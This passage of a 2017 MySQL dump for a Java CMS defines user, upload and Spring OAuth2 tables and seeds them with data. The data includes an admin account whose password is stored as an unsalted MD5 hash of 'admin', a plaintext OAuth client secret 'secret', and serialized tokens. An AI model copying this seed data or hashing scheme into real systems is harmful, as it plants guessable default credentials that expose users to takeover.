  `last_modified` bigint(20) NOT NULL COMMENT '最后修改时间',
  `is_directory` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否目录',
  PRIMARY KEY (`tpl_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='模板表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jo_template`
--

LOCK TABLES `jo_template` WRITE;
/*!40000 ALTER TABLE `jo_template` DISABLE KEYS */;
/*!40000 ALTER TABLE `jo_template` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jo_upload`
--

DROP TABLE IF EXISTS `jo_upload`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jo_upload` (
  `filename` varchar(150) NOT NULL COMMENT '文件名',
  `length` int(11) NOT NULL COMMENT '文件大小(字节)',
  `last_modified` bigint(20) NOT NULL COMMENT '最后修改时间',
  `content` longblob NOT NULL COMMENT '内容',
  PRIMARY KEY (`filename`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='上传附件表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jo_upload`
--

LOCK TABLES `jo_upload` WRITE;
/*!40000 ALTER TABLE `jo_upload` DISABLE KEYS */;
/*!40000 ALTER TABLE `jo_upload` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jo_user`
--

DROP TABLE IF EXISTS `jo_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jo_user` (
  `user_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '用户ID',
  `username` varchar(100) NOT NULL COMMENT '用户名',
  `email` varchar(100) DEFAULT NULL COMMENT '电子邮箱',
  `password` char(32) NOT NULL COMMENT '密码',
  `register_time` datetime NOT NULL COMMENT '注册时间',
  `register_ip` varchar(50) NOT NULL DEFAULT '127.0.0.1' COMMENT '注册IP',
  `last_login_time` datetime NOT NULL COMMENT '最后登录时间',
  `last_login_ip` varchar(50) NOT NULL DEFAULT '127.0.0.1' COMMENT '最后登录IP',
  `login_count` int(11) NOT NULL DEFAULT '0' COMMENT '登录次数',
  `reset_key` char(32) DEFAULT NULL COMMENT '重置密码KEY',
  `reset_pwd` varchar(10) DEFAULT NULL COMMENT '重置密码VALUE',
  `error_time` datetime DEFAULT NULL COMMENT '登录错误时间',
  `error_count` int(11) NOT NULL DEFAULT '0' COMMENT '登录错误次数',
  `error_ip` varchar(50) DEFAULT NULL COMMENT '登录错误IP',
  `activation` tinyint(1) NOT NULL DEFAULT '1' COMMENT '激活状态',
  `activation_code` char(32) DEFAULT NULL COMMENT '激活码',
  PRIMARY KEY (`user_id`),
  UNIQUE KEY `ak_username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='用户表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jo_user`
--

LOCK TABLES `jo_user` WRITE;
/*!40000 ALTER TABLE `jo_user` DISABLE KEYS */;
INSERT INTO `jo_user` VALUES (1,'admin','aa@qq.com','21232f297a57a5a743894a0e4a801fc3','2011-01-03 00:00:00','127.0.0.1','2017-02-20 09:34:20','127.0.0.1',1219,NULL,NULL,NULL,0,NULL,1,NULL);
/*!40000 ALTER TABLE `jo_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oauth_access_token`
--

DROP TABLE IF EXISTS `oauth_access_token`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oauth_access_token` (
  `token_id` varchar(256) DEFAULT NULL,
  `token` mediumblob,
  `authentication_id` varchar(256) NOT NULL,
  `user_name` varchar(256) DEFAULT NULL,
  `client_id` varchar(256) DEFAULT NULL,
  `authentication` mediumblob,
  `refresh_token` varchar(256) DEFAULT NULL,
  PRIMARY KEY (`authentication_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oauth_access_token`
--

LOCK TABLES `oauth_access_token` WRITE;
/*!40000 ALTER TABLE `oauth_access_token` DISABLE KEYS */;
INSERT INTO `oauth_access_token` VALUES ('871532db7d25bdb68688ff918d837eda','�\�\0sr\0Corg.springframework.security.oauth2.common.DefaultOAuth2AccessToken��6$�\�\0L\0additionalInformationt\0Ljava/util/Map;L\0\nexpirationt\0Ljava/util/Date;L\0refreshTokent\0?Lorg/springframework/security/oauth2/common/OAuth2RefreshToken;L\0scopet\0Ljava/util/Set;L\0	tokenTypet\0Ljava/lang/String;L\0valueq\0~\0xpsr\0java.util.Collections$EmptyMapY6�Z\�\�\�\0\0xpsr\0java.util.Datehj�KYt\0\0xpw\0\0\\�v{xsr\0Lorg.springframework.security.oauth2.common.DefaultExpiringOAuth2RefreshToken/\�Gc�\�ɷ\0L\0\nexpirationq\0~\0xr\0Dorg.springframework.security.oauth2.common.DefaultOAuth2RefreshTokens\�\ncT\�^\0L\0valueq\0~\0xpt\0$b2ad7553-c9e6-4641-83a5-cbe8af15c1d8sq\0~\0	w\0\0];b�xsr\0%java.util.Collections$UnmodifiableSet��я��U\0\0xr\0,java.util.Collections$UnmodifiableCollectionB\0�\�^�\0L\0ct\0Ljava/util/Collection;xpsr\0java.util.LinkedHashSet\�l\�Z�\�*\0\0xr\0java.util.HashSet�D�����4\0\0xpw\0\0\0?@\0\0\0\0\0t\0readt\0writext\0bearert\0$4882ad2e-fb68-441e-b5d2-5eddc22277a7','1e48b66719deae09a39143879a4b762e','admin','clientapp','�\�\0sr\0Aorg.springframework.security.oauth2.provider.OAuth2Authentication�@bR\0L\0\rstoredRequestt\0<Lorg/springframework/security/oauth2/provider/OAuth2Request;L\0userAuthenticationt\02Lorg/springframework/security/core/Authentication;xr\0Gorg.springframework.security.authentication.AbstractAuthenticationTokenӪ(~nGd\0Z\0\rauthenticatedL\0authoritiest\0Ljava/util/Collection;L\0detailst\0Ljava/lang/Object;xp\0sr\0&java.util.Collections$UnmodifiableList�%1�\�\0L\0listt\0Ljava/util/List;xr\0,java.util.Collections$UnmodifiableCollectionB\0�\�^�\0L\0cq\0~\0xpsr\0java.util.ArrayListx�\��\�a�\0I\0sizexp\0\0\0w\0\0\0sr\0Borg.springframework.security.core.authority.SimpleGrantedAuthority\0\0\0\0\0\0�\0L\0rolet\0Ljava/lang/String;xpt\0admin:indexsq\0~\0\rt\0rest:accesssq\0~\0\rt\0soapxq\0~\0psr\0:org.springframework.security.oauth2.provider.OAuth2Request\0\0\0\0\0\0\0\0Z\0approvedL\0authoritiesq\0~\0L\0\nextensionst\0Ljava/util/Map;L\0redirectUriq\0~\0L\0refresht\0;Lorg/springframework/security/oauth2/provider/TokenRequest;L\0resourceIdst\0Ljava/util/Set;L\0\rresponseTypesq\0~\0xr\08org.springframework.security.oauth2.provider.BaseRequest6(z>�qi�\0L\0clientIdq\0~\0L\0requestParametersq\0~\0L\0scopeq\0~\0xpt\0	clientappsr\0%java.util.Collections$UnmodifiableMap��t�B\0L\0mq\0~\0xpsr\0java.util.HashMap\��\�`\�\0F\0\nloadFactorI\0	thresholdxp?@\0\0\0\0\0w\0\0\0\0\0\0t\0\ngrant_typet\0passwordt\0	client_idt\0	clientappt\0usernamet\0adminxsr\0%java.util.Collections$UnmodifiableSet��я��U\0\0xq\0~\0	sr\0java.util.LinkedHashSet\�l\�Z�\�*\0\0xr\0java.util.HashSet�D�����4\0\0xpw\0\0\0?@\0\0\0\0\0t\0readt\0writexsq\0~\0)w\0\0\0?@\0\0\0\0\0sq\0~\0\rt\0rest:accessxsq\0~\0?@\0\0\0\0\0\0w\0\0\0\0\0\0\0xppsq\0~\0)w\0\0\0?@\0\0\0\0\0t\0my_rest_apixsq\0~\0)w\0\0\0?@\0\0\0\0\0\0xsr\0Oorg.springframework.security.authentication.UsernamePasswordAuthenticationToken\0\0\0\0\0\0�\0L\0credentialsq\0~\0L\0	principalq\0~\0xq\0~\0sq\0~\0sq\0~\0\0\0\0w\0\0\0q\0~\0q\0~\0q\0~\0xq\0~\07sr\0java.util.LinkedHashMap4�N\\l��\0Z\0accessOrderxq\0~\0?@\0\0\0\0\0w\0\0\0\0\0\0t\0\rclient_secrett\0secretq\0~\0 q\0~\0!q\0~\0\"q\0~\0#q\0~\0$q\0~\0%x\0psr\07org.javacms.core.security.userdetails.CustomUserDetails\�(\�Y˔\0L\0usert\0Lorg/javacms/beans/User;xr\0org.javacms.beans.User��<Vx\"iw\0B\0\nactivationL\0activationCodeq\0~\0L\0emailq\0~\0L\0\nerrorCountt\0Ljava/lang/Integer;L\0errorIpq\0~\0L\0	errorTimet\0Ljava/util/Date;L\0lastLoginIpq\0~\0L\0\rlastLoginTimeq\0~\0@L\0\nloginCountq\0~\0?L\0passwordq\0~\0L\0\nregisterIpq\0~\0L\0registerTimeq\0~\0@L\0resetKeyq\0~\0L\0resetPwdq\0~\0L\0rolet\0Lorg/javacms/beans/Role;L\0userIdq\0~\0?L\0usernameq\0~\0xp\0pppppppppppppppt\0adminsq\0~\0>pt\0	aa@qq.compppt\0	127.0.0.1sr\0java.util.Datehj�KYt\0\0xpw\0\0ZY\'�`xpt\0 21232f297a57a5a743894a0e4a801fc3t\0	127.0.0.1sq\0~\0Gw\0\0-Gt\�\0xppsr\0org.javacms.beans.Role�-߅�J\�H\0C\0isSuperL\0idq\0~\0?L\0\npermissionq\0~\0L\0priorityq\0~\0?L\0roleNameq\0~\0L\0roleTypeq\0~\0L\0siteIdq\0~\0?xp\01sr\0java.lang.Integer⠤���8\0I\0valuexr\0java.lang.Number����\��\0\0xp\0\0\0sq\0~\0\0\0\0w\0\0\0sr\0 org.javacms.beans.RolePermissionяw�Fs\0L\0roleIdq\0~\0?L\0uriq\0~\0xppq\0~\0sq\0~\0Rpq\0~\0sq\0~\0Rpq\0~\0xsq\0~\0N\0\0\0\nt\0	管理员t\0\nROLE_ADMINpq\0~\0Pq\0~\0C','39a9b8c239c666ef6408ad4c796bc348'),('8331ba6bad718f15d59179b30b0ed10d','�\�\0sr\0Corg.springframework.security.oauth2.common.DefaultOAuth2AccessToken��6$�\�\0L\0additionalInformationt\0Ljava/util/Map;L\0\nexpirationt\0Ljava/util/Date;L\0refreshTokent\0?Lorg/springframework/security/oauth2/common/OAuth2RefreshToken;L\0scopet\0Ljava/util/Set;L\0	tokenTypet\0Ljava/lang/String;L\0valueq\0~\0xpsr\0java.util.Collections$EmptyMapY6�Z\�\�\�\0\0xpsr\0java.util.Datehj�KYt\0\0xpw\0\0[&�lxsr\0Lorg.springframework.security.oauth2.common.DefaultExpiringOAuth2RefreshToken/\�Gc�\�ɷ\0L\0\nexpirationq\0~\0xr\0Dorg.springframework.security.oauth2.common.DefaultOAuth2RefreshTokens\�\ncT\�^\0L\0valueq\0~\0xpt\0$e588e441-0efe-49fa-910d-57f2efa77550sq\0~\0	w\0\0[�,cxsr\0%java.util.Collections$UnmodifiableSet��я��U\0\0xr\0,java.util.Collections$UnmodifiableCollectionB\0�\�^�\0L\0ct\0Ljava/util/Collection;xpsr\0java.util.LinkedHashSet\�l\�Z�\�*\0\0xr\0java.util.HashSet�D�����4\0\0xpw\0\0\0?@\0\0\0\0\0t\0readt\0writext\0bearert\0$79720e8e-dc38-4dcf-a5df-55d93c6042e1','7dddff592c6dcdd9e78c9806897df1dd',NULL,'clientapp','�\�\0sr\0Aorg.springframework.security.oauth2.provider.OAuth2Authentication�@bR\0L\0\rstoredRequestt\0<Lorg/springframework/security/oauth2/provider/OAuth2Request;L\0userAuthenticationt\02Lorg/springframework/security/core/Authentication;xr\0Gorg.springframework.security.authentication.AbstractAuthenticationTokenӪ(~nGd\0Z\0\rauthenticatedL\0authoritiest\0Ljava/util/Collection;L\0detailst\0Ljava/lang/Object;xp\0sr\0&java.util.Collections$UnmodifiableList�%1�\�\0L\0listt\0Ljava/util/List;xr\0,java.util.Collections$UnmodifiableCollectionB\0�\�^�\0L\0cq\0~\0xpsr\0java.util.ArrayListx�\��\�a�\0I\0sizexp\0\0\0w\0\0\0sr\0Borg.springframework.security.core.authority.SimpleGrantedAuthority\0\0\0\0\0\0�\0L\0rolet\0Ljava/lang/String;xpt\0rest:accessxq\0~\0psr\0:org.springframework.security.oauth2.provider.OAuth2Request\0\0\0\0\0\0\0\0Z\0approvedL\0authoritiesq\0~\0L\0\nextensionst\0Ljava/util/Map;L\0redirectUriq\0~\0L\0refresht\0;Lorg/springframework/security/oauth2/provider/TokenRequest;L\0resourceIdst\0Ljava/util/Set;L\0\rresponseTypesq\0~\0xr\08org.springframework.security.oauth2.provider.BaseRequest6(z>�qi�\0L\0clientIdq\0~\0L\0requestParametersq\0~\0L\0scopeq\0~\0xpt\0	clientappsr\0%java.util.Collections$UnmodifiableMap��t�B\0L\0mq\0~\0xpsr\0java.util.HashMap\��\�`\�\0F\0\nloadFactorI\0	thresholdxp?@\0\0\0\0\0w\0\0\0\0\0\0t\0\ngrant_typet\0client_credentialst\0	client_idt\0	clientappxsr\0%java.util.Collections$UnmodifiableSet��я��U\0\0xq\0~\0	sr\0java.util.LinkedHashSet\�l\�Z�\�*\0\0xr\0java.util.HashSet�D�����4\0\0xpw\0\0\0?@\0\0\0\0\0t\0readt\0writexsq\0~\0#w\0\0\0?@\0\0\0\0\0q\0~\0xsq\0~\0\Z?@\0\0\0\0\0\0w\0\0\0\0\0\0\0xppsq\0~\0#w\0\0\0?@\0\0\0\0\0t\0my_rest_apixsq\0~\0#w\0\0\0?@\0\0\0\0\0\0xp','61477468d447c867c8eff3b3ba1cb832');
/*!40000 ALTER TABLE `oauth_access_token` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oauth_approvals`
--

DROP TABLE IF EXISTS `oauth_approvals`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oauth_approvals` (
  `userId` varchar(256) DEFAULT NULL,
  `clientId` varchar(256) DEFAULT NULL,
  `scope` varchar(256) DEFAULT NULL,
  `status` varchar(10) DEFAULT NULL,
  `expiresAt` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `lastModifiedAt` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oauth_approvals`
--

LOCK TABLES `oauth_approvals` WRITE;
/*!40000 ALTER TABLE `oauth_approvals` DISABLE KEYS */;
/*!40000 ALTER TABLE `oauth_approvals` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oauth_client_details`
--

DROP TABLE IF EXISTS `oauth_client_details`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oauth_client_details` (
  `client_id` varchar(256) NOT NULL,
  `resource_ids` varchar(256) DEFAULT NULL,
  `client_secret` varchar(256) DEFAULT NULL,
  `scope` varchar(256) DEFAULT NULL,
  `authorized_grant_types` varchar(256) DEFAULT NULL,
  `web_server_redirect_uri` varchar(256) DEFAULT NULL,
  `authorities` varchar(256) DEFAULT NULL,
  `access_token_validity` int(11) DEFAULT NULL,
  `refresh_token_validity` int(11) DEFAULT NULL,
  `additional_information` varchar(4096) DEFAULT NULL,
  `autoapprove` varchar(256) DEFAULT NULL,
  PRIMARY KEY (`client_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oauth_client_details`
--

LOCK TABLES `oauth_client_details` WRITE;
/*!40000 ALTER TABLE `oauth_client_details` DISABLE KEYS */;
INSERT INTO `oauth_client_details` VALUES ('clientapp','my_rest_api','secret','read,write','password,refresh_token,authorization_code,implicit,client_credentials','','rest:access',NULL,NULL,'{}','read,write');
/*!40000 ALTER TABLE `oauth_client_details` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oauth_client_token`
--

DROP TABLE IF EXISTS `oauth_client_token`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oauth_client_token` (
  `token_id` varchar(256) DEFAULT NULL,
  `token` mediumblob,
  `authentication_id` varchar(256) NOT NULL,
  `user_name` varchar(256) DEFAULT NULL,
  `client_id` varchar(256) DEFAULT NULL,
  PRIMARY KEY (`authentication_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oauth_client_token`
--

LOCK TABLES `oauth_client_token` WRITE;
/*!40000 ALTER TABLE `oauth_client_token` DISABLE KEYS */;
/*!40000 ALTER TABLE `oauth_client_token` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oauth_code`
--

DROP TABLE IF EXISTS `oauth_code`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oauth_code` (
  `code` varchar(256) DEFAULT NULL,
  `authentication` mediumblob
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oauth_code`
--

LOCK TABLES `oauth_code` WRITE;
/*!40000 ALTER TABLE `oauth_code` DISABLE KEYS */;
/*!40000 ALTER TABLE `oauth_code` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oauth_refresh_token`
--

DROP TABLE IF EXISTS `oauth_refresh_token`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oauth_refresh_token` (
  `token_id` varchar(256) DEFAULT NULL,
  `token` mediumblob,
  `authentication` mediumblob
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oauth_refresh_token`
--

LOCK TABLES `oauth_refresh_token` WRITE;
/*!40000 ALTER TABLE `oauth_refresh_token` DISABLE KEYS */;
INSERT INTO `oauth_refresh_token` VALUES ('61477468d447c867c8eff3b3ba1cb832','�\�\0sr\0Lorg.springframework.security.oauth2.common.DefaultExpiringOAuth2RefreshToken/\�Gc�\�ɷ\0L\0\nexpirationt\0Ljava/util/Date;xr\0Dorg.springframework.security.oauth2.common.DefaultOAuth2RefreshTokens\�\ncT\�^\0L\0valuet\0Ljava/lang/String;xpt\0$e588e441-0efe-49fa-910d-57f2efa77550sr\0java.util.Datehj�KYt\0\0xpw\0\0[�,cx','�\�\0sr\0Aorg.springframework.security.oauth2.provider.OAuth2Authentication�@bR\0L\0\rstoredRequestt\0<Lorg/springframework/security/oauth2/provider/OAuth2Request;L\0userAuthenticationt\02Lorg/springframework/security/core/Authentication;xr\0Gorg.springframework.security.authentication.AbstractAuthenticationTokenӪ(~nGd\0Z\0\rauthenticatedL\0authoritiest\0Ljava/util/Collection;L\0detailst\0Ljava/lang/Object;xp\0sr\0&java.util.Collections$UnmodifiableList�%1�\�\0L\0listt\0Ljava/util/List;xr\0,java.util.Collections$UnmodifiableCollectionB\0�\�^�\0L\0cq\0~\0xpsr\0java.util.ArrayListx�\��\�a�\0I\0sizexp\0\0\0w\0\0\0sr\0Borg.springframework.security.core.authority.SimpleGrantedAuthority\0\0\0\0\0\0�\0L\0rolet\0Ljava/lang/String;xpt\0rest:accessxq\0~\0psr\0:org.springframework.security.oauth2.provider.OAuth2Request\0\0\0\0\0\0\0\0Z\0approvedL\0authoritiesq\0~\0L\0\nextensionst\0Ljava/util/Map;L\0redirectUriq\0~\0L\0refresht\0;Lorg/springframework/security/oauth2/provider/TokenRequest;L\0resourceIdst\0Ljava/util/Set;L\0\rresponseTypesq\0~\0xr\08org.springframework.security.oauth2.provider.BaseRequest6(z>�qi�\0L\0clientIdq\0~\0L\0requestParametersq\0~\0L\0scopeq\0~\0xpt\0	clientappsr\0%java.util.Collections$UnmodifiableMap��t�B\0L\0mq\0~\0xpsr\0java.util.HashMap\��\�`\�\0F\0\nloadFactorI\0	thresholdxp?@\0\0\0\0\0w\0\0\0\0\0\0t\0\ngrant_typet\0client_credentialst\0	client_idt\0	clientappxsr\0%java.util.Collections$UnmodifiableSet��я��U\0\0xq\0~\0	sr\0java.util.LinkedHashSet\�l\�Z�\�*\0\0xr\0java.util.HashSet�D�����4\0\0xpw\0\0\0?@\0\0\0\0\0t\0readt\0writexsq\0~\0#w\0\0\0?@\0\0\0\0\0q\0~\0xsq\0~\0\Z?@\0\0\0\0\0\0w\0\0\0\0\0\0\0xppsq\0~\0#w\0\0\0?@\0\0\0\0\0t\0my_rest_apixsq\0~\0#w\0\0\0?@\0\0\0\0\0\0xp'),('39a9b8c239c666ef6408ad4c796bc348','�\�\0sr\0Lorg.springframework.security.oauth2.common.DefaultExpiringOAuth2RefreshToken/\�Gc�\�ɷ\0L\0\nexpirationt\0Ljava/util/Date;xr\0Dorg.springframework.security.oauth2.common.DefaultOAuth2RefreshTokens\�\ncT\�^\0L\0valuet\0Ljava/lang/String;xpt\0$b2ad7553-c9e6-4641-83a5-cbe8af15c1d8sr\0java.util.Datehj�KYt\0\0xpw\0\0];b�x','�\�\0sr\0Aorg.springframework.security.oauth2.provider.OAuth2Authentication�@bR\0L\0\rstoredRequestt\0<Lorg/springframework/security/oauth2/provider/OAuth2Request;L\0userAuthenticationt\02Lorg/springframework/security/core/Authentication;xr\0Gorg.springframework.security.authentication.AbstractAuthenticationTokenӪ(~nGd\0Z\0\rauthenticatedL\0authoritiest\0Ljava/util/Collection;L\0detailst\0Ljava/lang/Object;xp\0sr\0&java.util.Collections$UnmodifiableList�%1�\�\0L\0listt\0Ljava/util/List;xr\0,java.util.Collections$UnmodifiableCollectionB\0�\�^�\0L\0cq\0~\0xpsr\0java.util.ArrayListx�\��\�a�\0I\0sizexp\0\0\0w\0\0\0sr\0Borg.springframework.security.core.authority.SimpleGrantedAuthority\0\0\0\0\0\0�\0L\0rolet\0Ljava/lang/String;xpt\0admin:indexsq\0~\0\rt\0rest:accesssq\0~\0\rt\0soapxq\0~\0psr\0:org.springframework.security.oauth2.provider.OAuth2Request\0\0\0\0\0\0\0\0Z\0approvedL\0authoritiesq\0~\0L\0\nextensionst\0Ljava/util/Map;L\0redirectUriq\0~\0L\0refresht\0;Lorg/springframework/security/oauth2/provider/TokenRequest;L\0resourceIdst\0Ljava/util/Set;L\0\rresponseTypesq\0~\0xr\08org.springframework.security.oauth2.provider.BaseRequest6(z>�qi�\0L\0clientIdq\0~\0L\0requestParametersq\0~\0L\0scopeq\0~\0xpt\0	clientappsr\0%java.util.Collections$UnmodifiableMap��t�B\0L\0mq\0~\0xpsr\0java.util.HashMap\��\�`\�\0F\0\nloadFactorI\0	thresholdxp?@\0\0\0\0\0w\0\0\0\0\0\0t\0\ngrant_typet\0passwordt\0	client_idt\0	clientappt\0usernamet\0adminxsr\0%java.util.Collections$UnmodifiableSet��я��U\0\0xq\0~\0	sr\0java.util.LinkedHashSet\�l\�Z�\�*\0\0xr\0java.util.HashSet�D�����4\0\0xpw\0\0\0?@\0\0\0\0\0t\0readt\0writexsq\0~\0)w\0\0\0?@\0\0\0\0\0sq\0~\0\rt\0rest:accessxsq\0~\0?@\0\0\0\0\0\0w\0\0\0\0\0\0\0xppsq\0~\0)w\0\0\0?@\0\0\0\0\0t\0my_rest_apixsq\0~\0)w\0\0\0?@\0\0\0\0\0\0xsr\0Oorg.springframework.security.authentication.UsernamePasswordAuthenticationToken\0\0\0\0\0\0�\0L\0credentialsq\0~\0L\0	principalq\0~\0xq\0~\0sq\0~\0sq\0~\0\0\0\0w\0\0\0q\0~\0q\0~\0q\0~\0xq\0~\07sr\0java.util.LinkedHashMap4�N\\l��\0Z\0accessOrderxq\0~\0?@\0\0\0\0\0w\0\0\0\0\0\0t\0\rclient_secrett\0secretq\0~\0 q\0~\0!q\0~\0\"q\0~\0#q\0~\0$q\0~\0%x\0psr\07org.javacms.core.security.userdetails.CustomUserDetails\�(\�Y˔\0L\0usert\0Lorg/javacms/beans/User;xr\0org.javacms.beans.User��<Vx\"iw\0B\0\nactivationL\0activationCodeq\0~\0L\0emailq\0~\0L\0\nerrorCountt\0Ljava/lang/Integer;L\0errorIpq\0~\0L\0	errorTimet\0Ljava/util/Date;L\0lastLoginIpq\0~\0L\0\rlastLoginTimeq\0~\0@L\0\nloginCountq\0~\0?L\0passwordq\0~\0L\0\nregisterIpq\0~\0L\0registerTimeq\0~\0@L\0resetKeyq\0~\0L\0resetPwdq\0~\0L\0rolet\0Lorg/javacms/beans/Role;L\0userIdq\0~\0?L\0usernameq\0~\0xp\0pppppppppppppppt\0adminsq\0~\0>pt\0	aa@qq.compppt\0	127.0.0.1sr\0java.util.Datehj�KYt\0\0xpw\0\0ZY\'�`xpt\0 21232f297a57a5a743894a0e4a801fc3t\0	127.0.0.1sq\0~\0Gw\0\0-Gt\�\0xppsr\0org.javacms.beans.Role�-߅�J\�H\0C\0isSuperL\0idq\0~\0?L\0\npermissionq\0~\0L\0priorityq\0~\0?L\0roleNameq\0~\0L\0roleTypeq\0~\0L\0siteIdq\0~\0?xp\01sr\0java.lang.Integer⠤���8\0I\0valuexr\0java.lang.Number����\��\0\0xp\0\0\0sq\0~\0\0\0\0w\0\0\0sr\0 org.javacms.beans.RolePermissionяw�Fs\0L\0roleIdq\0~\0?L\0uriq\0~\0xppq\0~\0sq\0~\0Rpq\0~\0sq\0~\0Rpq\0~\0xsq\0~\0N\0\0\0\nt\0	管理员t\0\nROLE_ADMINpq\0~\0Pq\0~\0C');
/*!40000 ALTER TABLE `oauth_refresh_token` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2017-06-13 18:09:43
